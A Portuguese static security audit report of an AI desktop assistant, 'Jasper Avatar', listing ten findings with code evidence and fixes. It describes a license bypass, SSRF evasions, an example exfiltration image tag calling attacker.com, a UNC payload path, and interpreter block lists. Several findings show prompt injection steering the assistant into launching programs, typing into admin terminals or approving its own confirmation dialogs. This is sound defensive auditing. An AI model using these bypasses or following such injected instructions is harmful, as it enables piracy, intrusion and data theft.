# RELATÓRIO 3 — Segurança e Vulnerabilidades

Este relatório documenta detalhadamente todas as vulnerabilidades e falhas de segurança identificadas durante a auditoria estática do **Jasper Avatar**, seguindo rigorosamente o esquema de 14 campos técnicos obrigatórios.

---

### [SEC-01] Bypass de Licenciamento Local via JWK Pública Não Fixada (Unpinned), Fallback em Texto Puro e Sobrescrita de `JASPER_API_URL`
- **ID:** `SEC-01`
- **Título:** Bypass de Licenciamento Local via JWK Pública Não Fixada (Unpinned), Fallback em Texto Puro e Sobrescrita de `JASPER_API_URL`
- **Severidade:** `ALTA`
- **Confiança:** `Confirmada`
- **Categoria:** `Segurança`
- **Arquivo e intervalo de linhas:**
  - [`src/main/services/license-manager.ts#L30`](../src/main/services/license-manager.ts#L30), [`#L72-L124`](../src/main/services/license-manager.ts#L72-L124), [`#L144-L152`](../src/main/services/license-manager.ts#L144-L152), [`#L195-L206`](../src/main/services/license-manager.ts#L195-L206), [`#L238-L250`](../src/main/services/license-manager.ts#L238-L250)
  - [`src/main/config/config-store.ts#L17`](../src/main/config/config-store.ts#L17), [`#L34-L52`](../src/main/config/config-store.ts#L34-L52), [`#L208-L220`](../src/main/config/config-store.ts#L208-L220), [`#L233-L240`](../src/main/config/config-store.ts#L233-L240)
  - [`src/main/index.ts#L81-L97`](../src/main/index.ts#L81-L97)
- **Descrição técnica:**
  O subsistema de verificação de licença possui quatro falhas estruturais combinadas:
  1. **Chave pública Ed25519 não fixada (unpinned) no código:** Em vez de compilar a chave pública Ed25519 do servidor como uma constante imutável no binário do executável, o método `LicenseManager.fetchAndCachePublicKey()` baixa a chave da URL remota e a salva em texto puro na propriedade `licensePublicJwk` do arquivo local `%APPDATA%\jasper-avatar\jasper-config.json`. Na validação offline (`verifyOfflineLease()`), o sistema faz o parse do JSON do próprio usuário (`JSON.parse(cfg.licensePublicJwk)`) e o utiliza para validar a assinatura do `licenseLeaseToken`.
  2. **Fallback permissivo para texto puro em `decryptSecret`:** `decryptSecret()` em `config-store.ts#L50-L51` retorna qualquer valor que não comece com o prefixo `enc:` diretamente em texto legível ("legacy plaintext secret").
  3. **Sobrescrita da URL do servidor de licenças em produção:** `config-store.ts#L17` executa `dotenv.config()` incondicionalmente e `license-manager.ts#L30` aceita `process.env.JASPER_API_URL` mesmo quando `app.isPackaged === true`. Basta definir a variável de ambiente `JASPER_API_URL=http://127.0.0.1:PORT` para apontar o verificador para um servidor local mock que emita leases válidos com qualquer chave.
  4. **Execução de rotinas autônomas sem licença ativa e falha no handler de revogação:** Em `src/main/index.ts#L97`, `autonomyCoordinator.init()` é iniciado incondicionalmente no boot antes da validação da licença. Quando o callback `licenseManager.onRevoked` é acionado (`#L81-L90`), ele apenas desconecta o WebSocket do Gemini Live, mantendo todos os 23 módulos autônomos (cron, webhooks, automação de processos) executando sem licença.
- **Evidência concreta:**
  - Código em `src/main/services/license-manager.ts#L195-L206`:
    ```ts
    const cfg = configStore.getConfig();
    if (!cfg.licenseLeaseToken || !cfg.licensePublicJwk) { return null; }
    const jwk = JSON.parse(cfg.licensePublicJwk);
    const pubKey = crypto.createPublicKey({ key: jwk, format: 'jwk' });
    ```
  - Evidência adicional presente no próprio script de teste de fumaça oficial do repositório em [`scripts/smoke-packaged.ps1#L47-L92`](../scripts/smoke-packaged.ps1#L47-L92), que gera um par efêmero Ed25519 e injeta tanto `licensePublicJwk` quanto `licenseLeaseToken` no arquivo `jasper-config.json` para ativar o aplicativo empacotado sem servidor de licenças.
- **Condições necessárias:** Acesso de escrita local ao arquivo `%APPDATA%\jasper-avatar\jasper-config.json` ou definição da variável de ambiente `JASPER_API_URL`.
- **Impacto potencial:** Neutralização completa do modelo de licenciamento e pirataria trivial do software por qualquer usuário técnico em menos de 5 minutos, independentemente de o código-fonte estar fechado.
- **Forma segura de verificar:** Inspecionar `scripts/smoke-packaged.ps1#L47-L92` e `src/main/services/license-manager.ts#L195-L206`.
- **Recomendação de correção:**
  1. Fixar a chave pública Ed25519 de produção como constante no código-fonte de `license-manager.ts` e aceitar override de chave ou de `JASPER_API_URL` apenas se `!app.isPackaged`.
  2. Criptografar `licenseLeaseToken` e dados de licença via `safeStorage` (DPAPI) e rejeitar tokens legados em texto puro.
  3. Vincular a inicialização de `autonomyCoordinator.init()` à confirmação da licença e chamar `autonomyCoordinator.stopAll()` dentro de `onRevoked`.
- **Estimativa de esforço:** Baixo (2 a 4 horas).
- **Possíveis efeitos colaterais:** `scripts/smoke-packaged.ps1` deverá passar um parâmetro de desenvolvimento ou rodar em modo unpacked para testes de CI.

---

### [SEC-02] Execução Arbitrária de Scripts/Arquivos e Substituição de Alvo Pós-Confirmação em `ProcessManagerService.launchProgram`
- **ID:** `SEC-02`
- **Título:** Execução Arbitrária de Scripts/Arquivos e Substituição de Alvo Pós-Confirmação em `ProcessManagerService.launchProgram`
- **Severidade:** `ALTA`
- **Confiança:** `Confirmada`
- **Categoria:** `Segurança`
- **Arquivo e intervalo de linhas:**
  - [`src/main/autonomous/process-manager.ts#L40-L48`](../src/main/autonomous/process-manager.ts#L40-L48), [`#L106-L206`](../src/main/autonomous/process-manager.ts#L106-L206)
  - [`src/main/autonomous/scripts/search-programs.ps1#L70-L125`](../src/main/autonomous/scripts/search-programs.ps1#L70-L125)
- **Descrição técnica:**
  O método `launchProgram(programPath, args)` apresenta três vulnerabilidades graves combinadas:
  1. **Blocklist incompleta de interpretadores:** A função `isBlockedInterpreter()` (`#L40-L48`) sanitiza apenas extensões `.exe` e `.com` e compara apenas contra uma lista estrita de terminais clássicos (`cmd`, `powershell`, `pwsh`, `wscript`, `cscript`, `mshta`, `rundll32`, `regsvr32`, `wt`, `terminal`, `windows terminal`). Binários perigosos como `python`, `pythonw`, `node`, `bash`, `wsl`, `git`, `certutil`, `bitsadmin`, `msiexec`, `conhost`, `forfiles`, `pcalua` e arquivos de script (`.bat`, `.cmd`, `.ps1`, `.vbs`, `.js`, `.hta`, `.msi`) não constam na lista.
  2. **Execução delegada ao Shell do Windows (`explorer.exe`):** Nas linhas `#L171-L174`, se o alvo não terminar expressamente em `.exe` ou `.com`, o código executa `spawn('explorer.exe', [launchTarget])`. No Windows, passar um caminho para `explorer.exe` delega a execução diretamente ao `ShellExecute`, que executa scripts `.bat`, `.cmd`, `.vbs`, `.hta`, instaladores `.msi` ou caminhos UNC de rede (`\\attacker\share\payload.lnk`).
  3. **Substituição pós-confirmação (TOCTOU de UI):** A aprovação do usuário via `securityBroker.confirmOperation` ocorre com nível de risco `common` (que é auto-aprovado sem popup se `confirmationMode` for `'common'` ou `'all'`) exibindo apenas o nome textual bruto solicitado pela IA (`trimmed`). Apenas **depois** da aprovação, o código executa `this.searchPrograms(trimmed, 3)` (`#L144-L153`), que busca via Everything (`es.exe`) qualquer arquivo `*query*.exe` no disco inteiro e executa o executável encontrado sem nova validação de caminho.
- **Evidência concreta:**
  - Código em `src/main/autonomous/process-manager.ts#L144-L174`:
    ```ts
    const matches = await this.searchPrograms(trimmed, 3);
    if (matches.length > 0 && matches[0].path) {
      launchTarget = matches[0].path;
    }
    const isDirectExecutable = /\.(exe|com)$/i.test(launchTarget);
    const spawnCommand = isDirectExecutable ? launchTarget : 'explorer.exe';
    const spawnArgs = isDirectExecutable ? safeArgs : [launchTarget];
    const child = spawn(spawnCommand, spawnArgs, ...);
    ```
- **Condições necessárias:** Indução do modelo via prompt injection (e-mail, site consultado pelo navegador headless ou documento lido) chamando a ferramenta `launch_program`.
- **Impacto potencial:** Execução remota e arbitrária de código (RCE) no contexto da conta do usuário logado no Windows.
- **Forma segura de verificar:** Inspeção estática de `src/main/autonomous/process-manager.ts#L106-L206`.
- **Recomendação de correção:**
  1. Resolver o caminho exato do binário antes de invocar a confirmação do usuário e exibir o caminho absoluto completo no diálogo.
  2. Rejeitar caminhos fora das pastas do sistema e restringir `explorer.exe` exclusivamente a atalhos `.lnk` localizados no Menu Iniciar oficial.
  3. Expandir a lista de bloqueio para incluir todos os interpretadores, binários LOLBins e extensões executáveis conhecidas.
- **Estimativa de esforço:** Médio (4 a 6 horas).
- **Possíveis efeitos colaterais:** Executáveis portáteis na pasta `Downloads` exigirão aprovação explícita com exibição do caminho completo.

---

### [SEC-03] Bypass do Filtro de Segurança de Automação de UI via Substring de Título, Auto-Interação com o Jasper e Regex UTF-8 Corrompido
- **ID:** `SEC-03`
- **Título:** Bypass do Filtro de Segurança de Automação de UI via Substring de Título, Auto-Interação com o Jasper e Regex UTF-8 Corrompido
- **Severidade:** `ALTA`
- **Confiança:** `Confirmada`
- **Categoria:** `Segurança`
- **Arquivo e intervalo de linhas:**
  - [`src/main/autonomous/ui-automation.ts#L5-L24`](../src/main/autonomous/ui-automation.ts#L5-L24), [`#L111-L191`](../src/main/autonomous/ui-automation.ts#L111-L191)
  - [`src/main/autonomous/scripts/ui-automation.ps1#L48-L53`](../src/main/autonomous/scripts/ui-automation.ps1#L48-L53), [`#L96-L101`](../src/main/autonomous/scripts/ui-automation.ps1#L96-L101), [`#L154-L159`](../src/main/autonomous/scripts/ui-automation.ps1#L154-L159)
- **Descrição técnica:**
  1. **Validação realizada na substring de busca e não na janela real capturada:** `UIAutomationService.validateTarget()` verifica apenas se o parâmetro `windowTitle` casa com `SENSITIVE_WINDOW_PATTERN`. Em seguida, o script PowerShell `ui-automation.ps1` itera sobre as janelas do Windows e seleciona a primeira janela cujo título contenha a substring: `$w.Current.Name.ToLower().Contains($WindowTitle.ToLower())`. O script nunca verifica se o título completo da janela encontrada (`$targetWin.Current.Name`) ou seu processo associado (`ProcessName`) pertencem a um terminal administrativo ou aplicativo sensível. Passar argumentos como `windowTitle: "Administrador"` contorna o regex e encontra `"Administrador: Windows PowerShell"`, permitindo digitar comandos via `ui_type_text`.
  2. **Ausência de bloqueio para o próprio PID do Jasper:** Nem o TypeScript nem o PowerShell impedem automação sobre a própria janela do Jasper Avatar (`process.pid`), permitindo que a IA manipule e auto-aprove cliques em caixas de diálogo de confirmação de segurança.
  3. **Mojibake UTF-8 na expressão regular:** A constante `SENSITIVE_WINDOW_PATTERN` em `ui-automation.ts#L5` contém caracteres mal codificados em UTF-8: `seguran[cÃ§]a` e `usu[aÃ¡]rio`, corrompendo a correspondência de palavras acentuadas no Windows em português.
- **Evidência concreta:**
  - `src/main/autonomous/ui-automation.ts#L5`:
    ```ts
    const SENSITIVE_WINDOW_PATTERN = /(cmd\.exe|powershell|pwsh|windows terminal|wt\.exe|regedit|taskmgr|gerenciador de tarefas|uac|controle de conta|seguran[cÃ§]a do windows|bitwarden|1password|keepass|lastpass|autentica[cÃ§][aÃ£]o|credenciais)/i;
    ```
  - `src/main/autonomous/scripts/ui-automation.ps1#L98-L101`:
    ```powershell
    foreach ($w in $windows) {
      if ($w.Current.Name -and $w.Current.Name.ToLower().Contains($WindowTitle.ToLower())) {
        $targetWin = $w; break
      }
    }
    ```
- **Condições necessárias:** `enableUiAutomation: true` e invocação da ferramenta `ui_type_text` ou `ui_click_element`.
- **Impacto potencial:** Injeção arbitrária de comandos em terminais elevados ou alteração não autorizada de configurações do próprio sistema operacional.
- **Forma segura de verificar:** Inspeção estática dos arquivos citados.
- **Recomendação de correção:**
  1. Corrigir a codificação do regex para caracteres UTF-8 corretos (`seguran[cç]a`, `autentica[cç][aã]o`, `usu[aá]rio`).
  2. No PowerShell, após obter `$targetWin`, consultar o processo proprietário (`Get-Process -Id $targetWin.Current.ProcessId`) e abortar imediatamente se o PID for igual ao do Jasper ou se o processo for um terminal ou ferramenta administrativa.
- **Estimativa de esforço:** Baixo (2 a 3 horas).
- **Possíveis efeitos colaterais:** Nenhum para janelas de aplicativos comuns de produtividade.

---

### [SEC-04] Path Traversal Arbitrário em `GitWatcher` e Execução Sem Confirmação de `npm test`/`pytest` e Git Hooks
- **ID:** `SEC-04`
- **Título:** Path Traversal Arbitrário em `GitWatcher` e Execução Sem Confirmação de `npm test`/`pytest` e Git Hooks
- **Severidade:** `ALTA`
- **Confiança:** `Confirmada`
- **Categoria:** `Segurança`
- **Arquivo e intervalo de linhas:**
  - [`src/main/tools/autonomous-tools.ts#L141-L174`](../src/main/tools/autonomous-tools.ts#L141-L174), [`#L212-L219`](../src/main/tools/autonomous-tools.ts#L212-L219)
  - [`src/main/autonomous/git-watcher.ts#L50-L75`](../src/main/autonomous/git-watcher.ts#L50-L75), [`#L151-L197`](../src/main/autonomous/git-watcher.ts#L151-L197)
  - [`src/main/autonomous/subagent-orchestrator.ts#L115-L119`](../src/main/autonomous/subagent-orchestrator.ts#L115-L119)
- **Descrição técnica:**
  1. **`repoPath` aceito sem contenção:** As ferramentas `git_check_repo`, `git_suggest_commit` e `git_commit_changes` aceitam o parâmetro `args.repoPath` fornecido pelo modelo e o utilizam diretamente como diretório de trabalho (`cwd`) de comandos `git`, sem validar se o caminho pertence a `config.gitWatchedRepos` ou à lista de pastas permitidas pelo `SecurityBroker`.
  2. **Execução cega de suítes de teste via `spawn_subagent(tester)`:** A ferramenta `spawn_subagent` com role `tester` executa `gitWatcher.runTests()` (`npm test` ou `pytest`) sem passar pelo `ReflexionEngine` e sem solicitar confirmação ao usuário, executando códigos arbitrários definidos nos scripts do repositório alvo.
  3. **Execução de hooks do Git sem contenção:** `gitWatcher.commitAllChanges` executa `git commit -m <msg>` sem a flag `--no-verify`, permitindo o disparo de hooks `.git/hooks/pre-commit` arbitrários.
- **Evidência concreta:**
  - Código em `src/main/autonomous/git-watcher.ts#L50-L52`:
    ```ts
    public async checkRepoStatus(repoPath?: string): Promise<GitStatusSummary> {
      const target = repoPath || this.defaultRepoPath;
    ```
  - Código em `src/main/autonomous/subagent-orchestrator.ts#L115-L118`:
    ```ts
    case 'tester': {
      task.logs.push('Executando suite de testes no repositório padrão...');
      const testOutput = await gitWatcher.runTests();
    ```
- **Condições necessárias:** Invocação de ferramentas Git ou de subagente pela IA.
- **Impacto potencial:** Leitura de diffs e metadados de qualquer diretório Git na máquina, criação de commits em pastas arbitrárias e execução descontrolada de scripts de teste.
- **Forma segura de verificar:** Inspeção estática de `src/main/autonomous/git-watcher.ts` e `src/main/tools/autonomous-tools.ts`.
- **Recomendação de correção:**
  1. Validar que `repoPath` pertença explicitamente à lista `configStore.getConfig().gitWatchedRepos`.
  2. Exigir confirmação de segurança com risco crítico antes de executar `gitWatcher.runTests()`.
  3. Adicionar `--no-verify` aos commits automáticos.
- **Estimativa de esforço:** Baixo (2 horas).
- **Possíveis efeitos colaterais:** Repositórios monitorados precisarão estar cadastrados na tela de configurações.

---

### [SEC-05] Contorno de Proteção SSRF no `HeadlessBrowserService` via DNS Rebinding (TOCTOU), WebSockets `ws://` Não Filtrados e IPv6-Mapped IPv4 Hexadecimal
- **ID:** `SEC-05`
- **Título:** Contorno de Proteção SSRF no `HeadlessBrowserService` via DNS Rebinding (TOCTOU), WebSockets `ws://` Não Filtrados e IPv6-Mapped IPv4 Hexadecimal
- **Severidade:** `ALTA`
- **Confiança:** `Confirmada`
- **Categoria:** `Segurança`
- **Arquivo e intervalo de linhas:**
  - [`src/main/autonomous/headless-browser.ts#L13-L35`](../src/main/autonomous/headless-browser.ts#L13-L35), [`#L96-L111`](../src/main/autonomous/headless-browser.ts#L96-L111)
  - [`src/main/autonomous/webhook-manager.ts#L31-L84`](../src/main/autonomous/webhook-manager.ts#L31-L84), [`#L122-L145`](../src/main/autonomous/webhook-manager.ts#L122-L145)
- **Descrição técnica:**
  1. **DNS Rebinding (TOCTOU) no Chromium:** `assertSafeBrowserUrl` resolve o DNS no Node.js via `resolveAndCheckSSRF`, mas a carga real é feita pelo `BrowserWindow.loadURL(url)`. Como a pilha de rede do Chromium realiza sua própria resolução DNS independente e as requisições de sub-recursos em `onBeforeRequest` não resolvem DNS (apenas testam o hostname textual síncrono), um atacante utilizando um domínio com TTL zero ou um sub-recurso que resolva para `127.0.0.1` contorna a proteção.
  2. **Conexões WebSockets locais não interceptadas:** O filtro `webRequest.onBeforeRequest` escuta apenas os protocolos `http://*/*` e `https://*/*`. Como `javascript: true` está habilitado na janela headless para permitir renderização de SPAs, scripts da página visitada podem abrir conexões WebSocket arbitrárias (`ws://127.0.0.1:*`) contra serviços locais sem disparar o bloqueador.
  3. **Normalização hexadecimal de endereços IPv6-mapped IPv4:** Em `webhook-manager.ts#L45-L60`, `isPrivateOrLoopbackIP` trata sufixos `::ffff:` apenas se contiverem pontos (`.`). Porém, o parser nativo de URL do Node.js normaliza `new URL('http://[::ffff:127.0.0.1]').hostname` para a forma hexadecimal `[::ffff:7f00:1]`, que não contém pontos, contornando a validação de IP privado.
- **Evidência concreta:**
  - `src/main/autonomous/headless-browser.ts#L28`:
    ```ts
    win.webContents.session.webRequest.onBeforeRequest({ urls: ['http://*/*', 'https://*/*'] }, ...
    ```
  - `src/main/autonomous/webhook-manager.ts#L46-L51`:
    ```ts
    if (raw.startsWith('::ffff:')) {
      const mapped = raw.slice('::ffff:'.length);
      if (mapped.includes('.')) { return isPrivateOrLoopbackIP(mapped); }
    }
    ```
- **Condições necessárias:** Acesso a URLs externas via navegador headless ou envio de webhook para endpoint manipulado.
- **Impacto potencial:** Acesso não autorizado a serviços HTTP/WS da rede local (Home Assistant, Docker APIs, serviços na porta 8080/3000) e exfiltração do conteúdo para o modelo.
- **Forma segura de verificar:** No Node.js REPL, verificar o resultado de `new URL('http://[::ffff:127.0.0.1]').hostname` (retorna `[::ffff:7f00:1]`).
- **Recomendação de correção:**
  1. Tratar a conversão de grupos hexadecimais de `::ffff:XXXX:YYYY` para octetos decimais de IPv4.
  2. Interceptar protocolos `ws://*/*` e `wss://*/*` no `onBeforeRequest` da sessão headless.
  3. Utilizar partição de sessão isolada com regras de proxy forçadas para redes RFC1918.
- **Estimativa de esforço:** Médio (3 a 5 horas).
- **Possíveis efeitos colaterais:** Nenhum para navegação legítima em sites públicos.

---

### [SEC-06] Exfiltração de Dados / SSRF em `ReportGeneratorService.generatePdfReport` e Ausência de Contenção em `folderDefaultTarget`
- **ID:** `SEC-06`
- **Título:** Exfiltração de Dados / SSRF em `ReportGeneratorService.generatePdfReport` e Ausência de Contenção em `folderDefaultTarget`
- **Severidade:** `MÉDIA`
- **Confiança:** `Confirmada`
- **Categoria:** `Segurança`
- **Arquivo e intervalo de linhas:**
  - [`src/main/autonomous/report-generator.ts#L52-L68`](../src/main/autonomous/report-generator.ts#L52-L68), [`#L173-L219`](../src/main/autonomous/report-generator.ts#L173-L219)
  - [`src/main/ipc/register-ipc.ts#L73`](../src/main/ipc/register-ipc.ts#L73)
- **Descrição técnica:**
  1. **Requisições externas durante geração de PDF:** `generatePdfReport(title, contentHtml)` concatena o conteúdo HTML fornecido pela IA diretamente em uma URL `data:text/html;charset=utf-8,...` carregada em um `BrowserWindow` oculto. Embora `javascript: false` esteja ativado, o Chromium não possui política CSP nem filtro de requisições de rede ativo nesta janela. Tags `<img src="https://attacker.com/exfil?d=...">` ou `@import` de CSS disparam requisições externas reais durante a impressão para PDF, possibilitando a exfiltração de dados confidenciais do relatório.
  2. **Ausência de validação em `folderDefaultTarget`:** `getTargetDirectory()` utiliza `cfg.folderDefaultTarget` sem validar contenção através do `SecurityBroker`.
- **Evidência concreta:**
  - `src/main/autonomous/report-generator.ts#L194-L206`:
    ```ts
    win = new BrowserWindow({ show: false, webPreferences: { nodeIntegration: false, contextIsolation: true, sandbox: true, webSecurity: true, javascript: false, offscreen: true } });
    const dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(fullHtml);
    await win.loadURL(dataUrl);
    ```
- **Condições necessárias:** Prompt injection indireto introduzindo tags de imagem em relatórios gerados pela ferramenta `generate_pdf_report`.
- **Impacto potencial:** Exfiltração silenciosa de trechos de documentos ou conversas para servidores de terceiros.
- **Forma segura de verificar:** Inspeção estática de `src/main/autonomous/report-generator.ts#L173-L219`.
- **Recomendação de correção:** Injetar meta tag CSP `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data:;">` no template HTML e bloquear requisições de rede na sessão da janela.
- **Estimativa de esforço:** Baixo (1 a 2 horas).
- **Possíveis efeitos colaterais:** Imagens externas remotas não serão baixadas nos PDFs gerados (imagens em Base64 `data:` continuarão funcionando normalmente).

---

### [SEC-07] Bypass de Toggles de Módulos, do Reflexion Engine e da Simulação Prévia em `executeSystemTool`
- **ID:** `SEC-07`
- **Título:** Bypass de Toggles de Módulos, do Reflexion Engine e da Simulação Prévia em `executeSystemTool`
- **Severidade:** `MÉDIA`
- **Confiança:** `Confirmada`
- **Categoria:** `Segurança`
- **Arquivo e intervalo de linhas:**
  - [`src/main/gemini-live.ts#L260-L266`](../src/main/gemini-live.ts#L260-L266)
  - [`src/main/tools/system-tools.ts#L149-L164`](../src/main/tools/system-tools.ts#L149-L164), [`#L262-L266`](../src/main/tools/system-tools.ts#L262-L266)
- **Descrição técnica:**
  1. **Roteamento de ferramentas sem filtragem de módulos ativos:** `gemini-live.ts#L260` verifica apenas `SYSTEM_FUNCTION_DECLARATIONS.some((d) => d.name === call.name)` em vez de validar contra as declarações ativas filtradas pela configuração do usuário (`getActiveSystemDeclarations`).
  2. **Falta de verificação em ferramentas críticas:** Em `system-tools.ts`, a ferramenta `get_detailed_hardware_stats` não checa `enableSystemHealth` e `organize_folder` não checa `enableFolderOrganizer`.
  3. **Execução sem simulação prévia e sem Reflexion Engine:** O README afirma que o organizador de pastas exige simulação antes de mover arquivos, mas a implementação invoca diretamente `folderOrganizer.organizeDirectory(folderAlias, false)` (`dryRun = false`) sem simulação e sem passar pelo `ReflexionEngine`.
- **Evidência concreta:**
  - `src/main/tools/system-tools.ts#L262-L266`:
    ```ts
    case 'organize_folder': {
      const folderAlias = String(args?.folderAlias || '');
      const result = await folderOrganizer.organizeDirectory(folderAlias, false);
      return { result };
    }
    ```
- **Condições necessárias:** Modelo emitir chamada para `organize_folder`.
- **Impacto potencial:** Movimentação massiva de arquivos em diretórios do usuário mesmo com o módulo desativado nas configurações.
- **Forma segura de verificar:** Inspeção estática de `src/main/tools/system-tools.ts#L262-L266`.
- **Recomendação de correção:** Validar toggles de configuração antes de executar ferramentas de sistema e passar a execução por `reflexionEngine.preExecutionCheck()`.
- **Estimativa de esforço:** Baixo (2 horas).
- **Possíveis efeitos colaterais:** Nenhum.

---

### [SEC-08] Leitura de Arquivo Sem Contenção em `readQrCode`, Parâmetro `languages` Não Validado no OCR e Falta de Limite de Tamanho em `FileSummarizer`
- **ID:** `SEC-08`
- **Título:** Leitura de Arquivo Sem Contenção em `readQrCode`, Parâmetro `languages` Não Validado no OCR e Falta de Limite de Tamanho em `FileSummarizer`
- **Severidade:** `MÉDIA`
- **Confiança:** `Confirmada`
- **Categoria:** `Segurança`
- **Arquivo e intervalo de linhas:**
  - [`src/main/autonomous/qr-service.ts#L97-L105`](../src/main/autonomous/qr-service.ts#L97-L105)
  - [`src/main/autonomous/ocr-service.ts#L41-L72`](../src/main/autonomous/ocr-service.ts#L41-L72), [`#L101-L116`](../src/main/autonomous/ocr-service.ts#L101-L116)
  - [`src/main/autonomous/file-summarizer.ts#L46-L106`](../src/main/autonomous/file-summarizer.ts#L46-L106)
- **Descrição técnica:**
  1. **`readQrCode` sem contenção de diretório:** `qrService.readQrCode()` aceita qualquer caminho absoluto do disco via `path.resolve(imagePath.trim())` sem validar se o arquivo está contido nas pastas permitidas do usuário.
  2. **`ocrService.recognize` sem validação de idioma:** Repassa o parâmetro `languages` diretamente para `tesseract.recognize()` sem validar formato alfanumérico (`por`, `eng`), e `recognizeScreen()` não verifica se o módulo está ativado (`isEnabled`).
  3. **`fileSummarizer.readFileContent` sem limite de tamanho:** Chama `fs.readFile()` para ler o arquivo inteiro na memória do processo Main sem validar o tamanho em bytes previamente, gerando risco de esgotamento de memória (OOM).
- **Evidência concreta:**
  - `src/main/autonomous/qr-service.ts#L98`: `const resolved = path.resolve(imagePath.trim());`
  - `src/main/autonomous/file-summarizer.ts#L66`: `const dataBuffer = await fs.readFile(cleanPath);`
- **Condições necessárias:** Invocação das ferramentas respectivas pela IA.
- **Impacto potencial:** Leitura de arquivos fora do escopo do usuário e travamento do processo Main ao tentar resumir arquivos muito grandes.
- **Forma segura de verificar:** Inspeção estática dos arquivos indicados.
- **Recomendação de correção:** Aplicar `securityBroker.resolveUserPath` em `readQrCode`, validar idiomas com `/^[a-z]{3}(\+[a-z]{3})*$/i` no OCR e limitar leitura de arquivos a 25 MB em `fileSummarizer`.
- **Estimativa de esforço:** Baixo (1 a 2 horas).
- **Possíveis efeitos colaterais:** Nenhum.

---

### [SEC-09] Ausência de `!path.isAbsolute(relativePath)` no Protocolo `app://`, Falta de Proteção SSRF no Host IMAP e Ausência de Redação de Segredos em E-mails/Arquivos/OCR
- **ID:** `SEC-09`
- **Título:** Ausência de `!path.isAbsolute(relativePath)` no Protocolo `app://`, Falta de Proteção SSRF no Host IMAP e Ausência de Redação de Segredos em E-mails/Arquivos/OCR
- **Severidade:** `MÉDIA`
- **Confiança:** `Confirmada`
- **Categoria:** `Segurança`
- **Arquivo e intervalo de linhas:**
  - [`src/main/index.ts#L23-L39`](../src/main/index.ts#L23-L39)
  - [`src/main/autonomous/calendar-email.ts#L234-L254`](../src/main/autonomous/calendar-email.ts#L234-L254)
  - [`src/main/tools/autonomous-tools.ts#L246-L253`](../src/main/tools/autonomous-tools.ts#L246-L253)
  - [`src/main/tools/system-tools.ts#L274-L294`](../src/main/tools/system-tools.ts#L274-L294)
- **Descrição técnica:**
  1. **Protocolo `app://` em Windows:** Em `src/main/index.ts#L31`, a verificação de contenção testa apenas `relativePath.startsWith('..')`. No Windows, caminhos apontando para outras unidades de disco (ex.: `path.relative('C:\\...', 'D:\\...')`) retornam caminhos absolutos como `'D:\\...'` que não começam com `'..'`, permitindo acesso a outros drives caso não haja `path.isAbsolute(relativePath)`.
  2. **Host IMAP sem checagem SSRF:** `fetchRealImapEmails()` conecta via socket TLS direto ao `emailImapHost` sem validar se o endereço IP pertence a faixas privadas de rede local.
  3. **Ausência de redação de segredos:** Conteúdos de e-mails, arquivos resumidos e textos extraídos via OCR são enviados diretamente para a nuvem da Google no contexto do Gemini sem passar por filtros de remoção de tokens e senhas (`redactSecrets`).
- **Evidência concreta:**
  - `src/main/index.ts#L31`: `if (relativePath.startsWith('..') || relativePath.includes('\0')) { return new Response('Forbidden', { status: 403 }); }`
- **Condições necessárias:** Leitura de e-mail ou documento contendo chaves ou dados confidenciais.
- **Impacto potencial:** Vazamento de credenciais locais em texto claro para a API Gemini e ausência de barreira de isolamento contra prompt injection em e-mails e PDFs.
- **Forma segura de verificar:** Inspeção estática das linhas mencionadas.
- **Recomendação de correção:** Adicionar `|| path.isAbsolute(relativePath)` no protocolo `app://`, validar o host IMAP contra IPs de loopback/RFC1918 e aplicar `redactSecrets` sobre e-mails, documentos e textos OCR antes de enviá-los ao modelo.
- **Estimativa de esforço:** Baixo (1 a 2 horas).
- **Possíveis efeitos colaterais:** Segredos presentes em e-mails lidos aparecerão redigidos como `[REDACTED_KEY]` para a IA.

---

### [SEC-10] Flags de Automação de Captura de Tela (`--capture-screenshot` / `--capture-showcase`) Expostas no Binário de Produção
- **ID:** `SEC-10`
- **Título:** Flags de Automação de Captura de Tela (`--capture-screenshot` / `--capture-showcase`) Expostas no Binário de Produção
- **Severidade:** `BAIXA`
- **Confiança:** `Confirmada`
- **Categoria:** `Segurança`
- **Arquivo e intervalo de linhas:**
  - [`src/main/windows/main-window.ts#L168-L242`](../src/main/windows/main-window.ts#L168-L242)
- **Descrição técnica:**
  O código em `main-window.ts` escuta as flags `--capture-screenshot` e `--capture-showcase` em tempo de inicialização sem restringir sua execução a `!app.isPackaged`. Quando passadas como argumento na inicialização, lêem a variável `process.env.SCREENSHOT_OUT_DIR` sem validação de caminho, injetam JavaScript na página para forçar a ocultação do modal de licença (`#modal-license-activation`), capturam imagens e chamam `app.quit()`.
- **Evidência concreta:**
  - `src/main/windows/main-window.ts#L168-L176`:
    ```ts
    const isCaptureMode = process.argv.includes('--capture-screenshot');
    const isShowcaseMode = process.argv.includes('--capture-showcase');
    if (isCaptureMode || isShowcaseMode) {
      const outDir = process.env.SCREENSHOT_OUT_DIR ? path.resolve(process.env.SCREENSHOT_OUT_DIR) : ...
    ```
- **Condições necessárias:** Execução do binário compilado passando argumentos de linha de comando.
- **Impacto potencial:** Gravação de arquivos PNG em diretórios arbitrários através da variável de ambiente e exposição de rotinas de teste no binário final.
- **Forma segura de verificar:** Inspeção estática de `src/main/windows/main-window.ts#L168-L242`.
- **Recomendação de correção:** Condicionar o bloco de captura a `if (!app.isPackaged && (isCaptureMode || isShowcaseMode))`.
- **Estimativa de esforço:** Trivial (15 minutos).
- **Possíveis efeitos colaterais:** Nenhum em ambientes de produção.

